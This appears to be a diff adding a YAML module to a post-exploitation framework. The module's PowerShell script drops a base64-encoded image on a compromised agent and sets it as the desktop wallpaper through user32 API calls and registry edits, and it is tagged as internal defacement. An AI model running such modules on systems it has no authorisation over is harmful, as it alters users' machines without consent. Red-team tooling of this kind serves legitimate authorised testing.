@@ -1,0 +1,96 @@
+name: Set-Wallpaper
+authors:
+  - name: Will Schroeder
+    handle: '@harmj0y'
+    link: https://twitter.com/harmj0y
+description: Uploads a specified image to the target system and sets it as the desktop
+  wallpaper, visually altering the user's environment for humorous, disruptive, or
+  psychological effect. This module leverages PowerShell to transfer a .jpg image,
+  save it locally, and use Windows API calls to change the desktop background, supporting
+  various wallpaper styles. The technique is intended for pranks, red team morale-boosting,
+  or psychological operations, and is non-destructive in nature. Changing the wallpaper
+  can surprise, amuse, or confuse users, and is a classic method for demonstrating
+  access or delivering a visual message. No administrative privileges are required,
+  and the prank is harmless, leaving no persistent changes beyond the wallpaper modification.
+  Use responsibly and with consideration for the target audience.
+software: ''
+tactics: [TA0040]
+techniques: [T1491.001]
+background: false
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://social.technet.microsoft.com/forums/scriptcenter/en-US/9af1769e-197f-4ef3-933f-83cb8f065afb/background-change
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: LocalImagePath
+    description: Local image path to set the agent wallpaper as.
+    required: true
+    value: ''
+script: |
+  Function Set-WallPaper
+  {
+      [CmdletBinding()] Param($WallpaperData)
+
+      $SavePath = "$Env:UserProfile\\AppData\\Local\\wallpaper" + ".jpg"
+
+      Set-Content -value $([System.Convert]::FromBase64String($WallpaperData)) -encoding byte -path $SavePath
+
+  Add-Type @"
+  using System;
+  using System.Runtime.InteropServices;
+  using Microsoft.Win32;
+  namespace Wallpaper
+  {
+    public enum Style : int
+    {
+      Tiled, Centered, Stretched, Fit
+    }
+
+
+    public class Setter {
+     public const int SetDesktopWallpaper = 20;
+     public const int UpdateIniFile = 0x01;
+     public const int SendWinIniChange = 0x02;
+
+     [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+     private static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni);
+
+     public static void SetWallpaper ( string path, Wallpaper.Style style ) {
+       SystemParametersInfo( SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange );
+
+       RegistryKey key = Registry.CurrentUser.OpenSubKey("Control Panel\\\\Desktop", true);
+       switch( style )
+       {
+         case Style.Stretched :
+           key.SetValue(@"WallpaperStyle", "2") ;
+           key.SetValue(@"TileWallpaper", "0") ;
+           break;
+         case Style.Centered :
+           key.SetValue(@"WallpaperStyle", "1") ;
+           key.SetValue(@"TileWallpaper", "0") ;
+           break;
+         case Style.Tiled :
+           key.SetValue(@"WallpaperStyle", "1") ;
+           key.SetValue(@"TileWallpaper", "1") ;
+           break;
+         case Style.Fit :
+           key.SetValue(@"WallpaperStyle", "6") ;
+           key.SetValue(@"TileWallpaper", "0") ;
+           break;
+       }
+       key.Close();
+     }
+    }
+  }
+  "@
+
+      $null = [Wallpaper.Setter]::SetWallpaper( (Convert-Path $SavePath), "Fit" )
+  }
+script_end: Set-Wallpaper {{ PARAMS }}
